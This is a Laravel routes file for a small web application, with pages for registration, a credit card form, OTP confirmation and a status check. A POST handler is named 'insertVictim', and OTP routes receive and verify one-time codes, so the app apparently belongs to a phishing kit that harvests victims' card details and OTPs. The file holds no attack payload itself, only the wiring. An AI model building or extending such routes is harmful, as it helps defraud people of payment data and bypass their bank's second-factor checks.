<?php

use App\Http\Controllers\checkstatusController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\homeController;
use App\Http\Controllers\formController;
use App\Http\Controllers\otpController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
| Chima
*/

// Route::get('/', function () {
//     return view('welcome');
// });

Route::get('/', [homeController::class, 'index'])->name('home');
Route::get('/register12', [formController::class, 'index'])->name('register');
Route::get('/register', [formController::class, 'oldform'])->name('register2');
Route::get('/creditcard',[formController::class,'card'])->name('creditcard');
Route::get('/confirm_otp',[formController::class,'otp'])->name('confirm_otp');
Route::get('/info',[formController::class,'info'])->name('checkinfo');
Route::post('/senddata', [formController::class, 'insertVictim'])->name('insertvictim');

Route::post('/register/submit', [formController::class,'insert'])->name('register.submit');

Route::get('/getotp', [otpController::class, 'recieveOtp'])->name('getotp');
ROute::get('/verifyotp', [otpController::class, 'verifyOtp'])->name('verifyotp');

Route::get('/testSuccess', [formController::class,'testSuccess'])->name('testSuccess');

Route::get('/checkStatus', [checkstatusController::class, 'checkForm'])->name('checkStatus');

Route::post('/checking', [checkstatusController::class, 'checkStatus'])->name('checkingstatus');

// หาเกิด merge conflict ให้กด keep both นะทุกคนๆๆๆ
